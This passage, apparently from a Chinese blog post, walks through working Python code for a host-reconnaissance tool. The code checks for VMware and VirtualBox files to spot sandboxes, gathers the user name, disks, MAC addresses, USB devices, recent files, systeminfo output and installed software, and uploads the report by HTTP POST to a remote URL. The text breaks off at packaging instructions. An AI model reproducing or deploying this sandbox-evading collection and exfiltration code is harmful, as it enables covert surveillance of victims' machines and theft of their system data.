<h3 id="获取虚拟环境DLLS"><a href="#获取虚拟环境DLLS" class="headerlink" title="获取虚拟环境DLLS"></a>获取虚拟环境DLLS</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_sandbox_dlls</span>():</span><br><span class="line">    <span class="comment"># 要检查的文件路径列表，这些路径通常与虚拟机或沙箱软件相关</span></span><br><span class="line">    <span class="comment"># 如果这些文件存在，可能表明该系统运行在虚拟机或沙箱环境中</span></span><br><span class="line">    file_paths = [</span><br><span class="line">        <span class="string">r&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\Program Files\Common Files\VMware\Drivers\mouse\Win8\vmmousever.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\Vmmouse.sys&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\vmtray.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\VMToolsHook.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\vmmousever.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\vmhgfs.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\vmGuestLib.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\VBoxMouse.sys&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\VBoxGuest.sys&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\VBoxSF.sys&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\VBoxVideo.sys&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxdisp.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxhook.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxoglerrorspu.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxoglpassthroughspu.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxservice.exe&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxtray.exe&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\VBoxControl.exe&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化一个字符串，用于存储检查结果，并包含一个标题行</span></span><br><span class="line">    existing_files = <span class="string">&quot;=== 沙箱相关 === \n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历每个文件路径，检查该路径所指的文件是否存在</span></span><br><span class="line">    <span class="keyword">for</span> file_path <span class="keyword">in</span> file_paths:</span><br><span class="line">        <span class="comment"># 使用 os.path.exists() 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(file_path):</span><br><span class="line">            <span class="comment"># 如果文件存在，将文件路径加入结果字符串</span></span><br><span class="line">            existing_files += <span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span>\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 如果文件不存在，记录文件未找到的信息</span></span><br><span class="line">            existing_files += <span class="string">f&quot;File not found: <span class="subst">&#123;file_path&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回包含所有检查结果的字符串</span></span><br><span class="line">    <span class="keyword">return</span> existing_files</span><br></pre></td></tr></table></figure>

<h3 id="获取当前用户"><a href="#获取当前用户" class="headerlink" title="获取当前用户"></a>获取当前用户</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_user</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 尝试获取当前登录用户的用户名</span></span><br><span class="line">        <span class="comment"># os.getlogin() 返回当前在控制台上登录的用户的用户名</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;当前用户: <span class="subst">&#123;os.getlogin()&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在获取用户名的过程中出现异常，捕获异常并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking admin user: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="获取硬盘信息"><a href="#获取硬盘信息" class="headerlink" title="获取硬盘信息"></a>获取硬盘信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_disk_info</span>():</span><br><span class="line">    <span class="comment"># 初始化一个包含标题的字符串，用于存储所有磁盘信息</span></span><br><span class="line">    disk_info = <span class="string">&quot;\n=== 硬盘信息 ===\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 psutil.disk_partitions() 获取系统中所有分区的信息</span></span><br><span class="line">        <span class="comment"># https://liaoxuefeng.com/books/python/third-party-modules/psutil/</span></span><br><span class="line">        partitions = psutil.disk_partitions()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 遍历每个分区，获取详细信息</span></span><br><span class="line">        <span class="keyword">for</span> partition <span class="keyword">in</span> partitions:</span><br><span class="line">            <span class="comment"># 获取分区的使用情况</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                usage = psutil.disk_usage(partition.mountpoint)  <span class="comment"># 获取分区的使用情况</span></span><br><span class="line">                total_size_gb = usage.total / (<span class="number">1024</span> ** <span class="number">3</span>)  <span class="comment"># 将字节转换为GB</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 将获取到的分区信息格式化并添加到 disk_info 字符串中</span></span><br><span class="line">                disk_info += (</span><br><span class="line">                    <span class="string">f&quot;盘符: <span class="subst">&#123;partition.device&#125;</span>\n&quot;</span>  <span class="comment"># 分区设备名</span></span><br><span class="line">                    <span class="string">f&quot;挂载点: <span class="subst">&#123;partition.mountpoint&#125;</span>\n&quot;</span>  <span class="comment"># 挂载点</span></span><br><span class="line">                    <span class="string">f&quot;文件系统类型: <span class="subst">&#123;partition.fstype&#125;</span>\n&quot;</span>  <span class="comment"># 文件系统类型</span></span><br><span class="line">                    <span class="string">f&quot;总大小: <span class="subst">&#123;total_size_gb:<span class="number">.2</span>f&#125;</span> GB\n\n&quot;</span>  <span class="comment"># 总大小，以GB为单位，保留两位小数</span></span><br><span class="line">                )</span><br><span class="line">            <span class="keyword">except</span> PermissionError:</span><br><span class="line">                <span class="comment"># 如果访问某个分区的使用情况时权限不足，捕获异常并记录相关信息</span></span><br><span class="line">                disk_info += (</span><br><span class="line">                    <span class="string">f&quot;盘符: <span class="subst">&#123;partition.device&#125;</span>\n&quot;</span>  <span class="comment"># 分区设备名</span></span><br><span class="line">                    <span class="string">&quot;挂载点: Access Denied\n&quot;</span>  <span class="comment"># 无法访问挂载点</span></span><br><span class="line">                    <span class="string">&quot;文件系统类型: Unknown\n&quot;</span>  <span class="comment"># 无法获取文件系统类型</span></span><br><span class="line">                    <span class="string">&quot;总大小: Unknown\n\n&quot;</span>  <span class="comment"># 无法获取总大小</span></span><br><span class="line">                )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在获取分区信息的过程中出现异常，捕获异常并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error retrieving disk information: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回包含所有分区信息的字符串</span></span><br><span class="line">    <span class="keyword">return</span> disk_info</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="获取MAC信息"><a href="#获取MAC信息" class="headerlink" title="获取MAC信息"></a>获取MAC信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_mac_addresses</span>():</span><br><span class="line">    <span class="comment"># 初始化一个字符串，用于存储所有接口的MAC地址信息</span></span><br><span class="line">    mac_addresses = <span class="string">&quot;=== 所有接口的MAC地址 ===\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 win32com.client 来访问 Windows WMI 服务</span></span><br><span class="line">        <span class="comment"># 获取一个 WMI 客户端对象，可以通过WMI查询获取系统信息</span></span><br><span class="line">        wmi_client = win32com.client.GetObject(<span class="string">&quot;winmgmts:&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用 WMI 查询 &quot;Win32_NetworkAdapter&quot; 类来获取所有网络适配器的信息</span></span><br><span class="line">        <span class="keyword">for</span> nic <span class="keyword">in</span> wmi_client.InstancesOf(<span class="string">&quot;Win32_NetworkAdapter&quot;</span>):</span><br><span class="line">            <span class="comment"># 检查网络适配器是否有MAC地址和网络连接ID</span></span><br><span class="line">            <span class="keyword">if</span> nic.MACAddress <span class="keyword">and</span> nic.NetConnectionID:</span><br><span class="line">                <span class="comment"># 如果MAC地址和连接ID存在，将其格式化并添加到 mac_addresses 字符串中</span></span><br><span class="line">                mac_addresses += (</span><br><span class="line">                    <span class="string">f&quot;接口名称: <span class="subst">&#123;nic.NetConnectionID&#125;</span>, &quot;</span>  <span class="comment"># 网络接口的连接名称</span></span><br><span class="line">                    <span class="string">f&quot;MAC地址: <span class="subst">&#123;nic.MACAddress&#125;</span>\n&quot;</span>  <span class="comment"># MAC地址</span></span><br><span class="line">                )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在任何步骤中发生异常，捕获异常并返回包含错误信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error retrieving MAC addresses: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回包含所有获取的MAC地址信息的字符串</span></span><br><span class="line">    <span class="keyword">return</span> mac_addresses</span><br></pre></td></tr></table></figure>

<h3 id="获取USB设备"><a href="#获取USB设备" class="headerlink" title="获取USB设备"></a>获取USB设备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_usb_devices</span>():</span><br><span class="line">    <span class="comment"># 初始化一个字符串，用于存储所有USB设备的信息</span></span><br><span class="line">    usb_devices = <span class="string">&quot;\n === USB设备信息 ===\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 win32com.client 来访问 Windows WMI 服务</span></span><br><span class="line">        <span class="comment"># 获取一个 WMI 客户端对象，可以通过WMI查询获取系统信息</span></span><br><span class="line">        wmi_client = win32com.client.GetObject(<span class="string">&quot;winmgmts:&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用 WMI 查询 &quot;Win32_PnPEntity&quot; 类来获取所有即插即用设备的信息</span></span><br><span class="line">        <span class="keyword">for</span> device <span class="keyword">in</span> wmi_client.InstancesOf(<span class="string">&quot;Win32_PnPEntity&quot;</span>):</span><br><span class="line">            <span class="comment"># 检查设备是否有名称，并且名称或描述中包含 &quot;USB&quot;</span></span><br><span class="line">            <span class="keyword">if</span> device.Name <span class="keyword">and</span> (<span class="string">&quot;USB&quot;</span> <span class="keyword">in</span> device.Name <span class="keyword">or</span> <span class="string">&quot;USB&quot;</span> <span class="keyword">in</span> device.Description):</span><br><span class="line">                <span class="comment"># 如果设备名称或描述中包含 &quot;USB&quot;，则认为是USB设备</span></span><br><span class="line">                <span class="comment"># 将设备的相关信息格式化并添加到 usb_devices 字符串中</span></span><br><span class="line">                usb_devices += (</span><br><span class="line">                    <span class="string">f&quot;设备名称: <span class="subst">&#123;device.Name&#125;</span>\n&quot;</span>  <span class="comment"># 设备的名称</span></span><br><span class="line">                    <span class="string">f&quot;设备ID: <span class="subst">&#123;device.DeviceID <span class="keyword">if</span> device.DeviceID <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>\n&quot;</span>  <span class="comment"># 设备ID，如果不存在则显示 &#x27;N/A&#x27;</span></span><br><span class="line">                    <span class="string">f&quot;PNP设备ID: <span class="subst">&#123;device.PNPDeviceID <span class="keyword">if</span> device.PNPDeviceID <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>\n&quot;</span>  <span class="comment"># PNP设备ID，如果不存在则显示 &#x27;N/A&#x27;</span></span><br><span class="line">                    <span class="string">f&quot;描述: <span class="subst">&#123;device.Description <span class="keyword">if</span> device.Description <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>\n\n&quot;</span>  <span class="comment"># 设备描述，如果不存在则显示 &#x27;N/A&#x27;</span></span><br><span class="line">                )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在获取设备信息的过程中发生异常，捕获异常并将错误信息添加到 usb_devices 字符串中</span></span><br><span class="line">        usb_devices += <span class="string">f&quot;Error retrieving USB device information: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回包含所有USB设备信息的字符串</span></span><br><span class="line">    <span class="keyword">return</span> usb_devices</span><br></pre></td></tr></table></figure>

<h3 id="获取历史文件"><a href="#获取历史文件" class="headerlink" title="获取历史文件"></a>获取历史文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_recent_files</span>():</span><br><span class="line">    <span class="comment"># 初始化一个字符串，用于存储所有最近访问文件的信息</span></span><br><span class="line">    get_recent_files_list = <span class="string">&quot;=== Recent文件 ===\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 win32com.client 访问 Windows Shell API</span></span><br><span class="line">        <span class="comment"># Dispatch 创建一个 Shell.Application 对象，用于与 Windows Shell 进行交互</span></span><br><span class="line">        shell = win32com.client.Dispatch(<span class="string">&quot;Shell.Application&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 获取指定的命名空间，此处 0x08 对应于 Windows 的 &#x27;Recent&#x27; 文件夹</span></span><br><span class="line">        namespace = shell.NameSpace(<span class="number">0x08</span>)  <span class="comment"># 0x08 是系统中“最近使用的文件”文件夹的命名空间标识符</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果无法获取 &#x27;Recent&#x27; 文件夹的命名空间，返回错误信息</span></span><br><span class="line">        <span class="keyword">if</span> namespace <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;无法获取 &#x27;Recent&#x27; 文件夹的命名空间\n&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 获取 &#x27;Recent&#x27; 文件夹中的所有项目</span></span><br><span class="line">        items = namespace.Items()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 将文件夹中的文件数量添加到结果字符串中</span></span><br><span class="line">        get_recent_files_list += <span class="string">f&quot;Recent 文件夹中的文件数量: <span class="subst">&#123;items.Count&#125;</span>\n&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 遍历每个项目，将其名称添加到结果字符串中</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">            get_recent_files_list += <span class="string">f&quot;<span class="subst">&#123;item.Name&#125;</span>\n&quot;</span>  <span class="comment"># 文件名称</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 返回包含所有最近访问文件的信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> get_recent_files_list</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在访问 &#x27;Recent&#x27; 文件夹的过程中发生异常，捕获异常并返回包含错误信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;无法访问 &#x27;Recent&#x27; 文件夹: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Systeminfo"><a href="#Systeminfo" class="headerlink" title="Systeminfo"></a>Systeminfo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_system_info</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化一个字符串，用于存储系统信息</span></span><br><span class="line">        system_info = <span class="string">&quot;\n=== 系统信息 ===\n&quot;</span>     </span><br><span class="line">        <span class="comment"># 使用 subprocess 模块执行命令行命令</span></span><br><span class="line">        <span class="comment"># 调用 `systeminfo` 命令以获取系统的详细信息</span></span><br><span class="line">        <span class="comment"># check_output 函数执行命令并返回其输出，参数解释：</span></span><br><span class="line">        <span class="comment"># - &quot;systeminfo&quot;：要执行的命令</span></span><br><span class="line">        <span class="comment"># - shell=True：在命令行的shell中执行命令</span></span><br><span class="line">        <span class="comment"># - text=True：将输出解码为文本字符串（相当于设置 `universal_newlines=True`）</span></span><br><span class="line">        output = subprocess.check_output(<span class="string">&quot;systeminfo&quot;</span>, shell=<span class="literal">True</span>, text=<span class="literal">True</span>)   </span><br><span class="line">        <span class="comment"># 将获取的系统信息输出添加到 system_info 字符串中</span></span><br><span class="line">        system_info += output</span><br><span class="line">        <span class="comment"># 返回包含所有系统信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> system_info</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在执行命令时发生错误，捕获 CalledProcessError 异常</span></span><br><span class="line">        <span class="comment"># 返回包含错误信息的字符串，指示获取系统信息失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;获取系统信息失败: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="获取已安装软件"><a href="#获取已安装软件" class="headerlink" title="获取已安装软件"></a>获取已安装软件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_installed_software</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化一个字符串，用于存储已安装软件的信息</span></span><br><span class="line">        installed_software = <span class="string">&quot;\n=== 已安装软件 ===\n&quot;</span></span><br><span class="line">        <span class="comment"># 使用 subprocess 模块执行命令行命令</span></span><br><span class="line">        <span class="comment"># 调用 `wmic product list brief` 命令以获取已安装的软件列表的简要信息</span></span><br><span class="line">        <span class="comment"># check_output 函数执行命令并返回其输出，参数解释：</span></span><br><span class="line">        <span class="comment"># - &quot;wmic product list brief&quot;：要执行的命令，用于列出已安装软件的简要信息</span></span><br><span class="line">        <span class="comment"># - shell=True：在命令行的shell中执行命令</span></span><br><span class="line">        <span class="comment"># - text=True：将输出解码为文本字符串（在 Python 3.7 及以上版本中，text=True 等效于 universal_newlines=True）</span></span><br><span class="line">        output = subprocess.check_output(<span class="string">&quot;wmic product list brief&quot;</span>, shell=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># 将获取的已安装软件信息输出添加到 installed_software 字符串中</span></span><br><span class="line">        installed_software += output</span><br><span class="line">        <span class="comment"># 返回包含所有已安装软件信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> installed_software</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在执行命令时发生错误，捕获 CalledProcessError 异常</span></span><br><span class="line">        <span class="comment"># 返回包含错误信息的字符串，指示获取已安装软件失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;获取已安装软件失败: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(<span class="params">url, cookie, info</span>):</span><br><span class="line">    <span class="comment"># 构造HTTP请求的头部信息</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,      <span class="comment"># &#x27;Referer&#x27;头部，通常用于标识请求来源页面</span></span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: cookie     <span class="comment"># &#x27;Cookie&#x27;头部，用于在请求中附带会话或状态信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造表单数据项</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;MAX_FILE_SIZE&#x27;</span>: <span class="string">&#x27;100000&#x27;</span>,  <span class="comment"># 表单中指定的文件大小限制，单位为字节（这里为100KB）</span></span><br><span class="line">        <span class="string">&#x27;Upload&#x27;</span>: <span class="string">&#x27;Upload&#x27;</span>          <span class="comment"># 表单中可能的一个字段，表示上传操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造要上传的文件信息</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;uploaded&#x27;</span>: (               <span class="comment"># 表单中对应文件上传字段的名称</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;os.getlogin()&#125;</span>---info.txt&#x27;</span>,  <span class="comment"># 上传文件的名称，使用当前登录用户名拼接固定字符串</span></span><br><span class="line">            info,                   <span class="comment"># 文件的内容，通过info参数传入</span></span><br><span class="line">            <span class="string">&#x27;text/plain&#x27;</span>            <span class="comment"># 文件的MIME类型，这里指定为纯文本</span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 requests 库发送HTTP POST请求</span></span><br><span class="line">    requests.post(</span><br><span class="line">        url,            <span class="comment"># 目标URL</span></span><br><span class="line">        headers=headers,  <span class="comment"># 请求头部信息</span></span><br><span class="line">        data=data,        <span class="comment"># 表单数据项</span></span><br><span class="line">        files=files       <span class="comment"># 要上传的文件信息</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    report = (</span><br><span class="line">            <span class="string">&quot;=== 系统综合信息报告 ===\n&quot;</span></span><br><span class="line">            + check_cpu_virtualization() + check_language()</span><br><span class="line">            + get_cpu_info() + get_user()</span><br><span class="line">            + get_process_count() + check_start_time()</span><br><span class="line">            + check_sandbox_dlls() + get_disk_info()</span><br><span class="line">            + get_all_mac_addresses() + get_usb_devices()</span><br><span class="line">            + get_recent_files() + get_current_directory_and_app_name()</span><br><span class="line">            + get_system_info() + get_installed_software()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> report</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 打包流程:</span></span><br><span class="line">    <span class="comment">#     1. python -m venv venv</span></span><br><span class="line">    <span class="comment">#     2. 